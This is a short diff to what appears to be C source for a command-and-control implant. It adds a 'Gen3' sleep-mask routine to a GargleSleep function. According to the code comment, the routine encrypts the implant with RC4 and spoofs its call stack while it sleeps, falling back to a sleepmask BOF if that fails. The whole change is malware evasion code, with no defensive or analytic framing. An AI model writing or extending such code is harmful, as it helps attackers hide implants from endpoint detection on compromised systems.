@@ -6,6 +6,7 @@
 #include "gargleint.h"
 #include "track_memory.h"
 #include "datastore.h"
+#include "sleepmask_gen3.h"
 #include "parse.h"
 #include <stdlib.h>
 
@@ -35,6 +36,13 @@ void GargleSleep(DWORD time) {
 		Sleep(time);
 		return;
 	}
+
+#if defined(_M_X64)
+	/* Phase 1: self-contained Gen3 window (RC4 + callstack spoof) first;
+	 * any init failure falls through to the official sleepmask BOF. */
+	if (gen3_sleep(time))
+		return;
+#endif
 
 	decoded = (char *)malloc(16384);
 	if (decoded == NULL) {
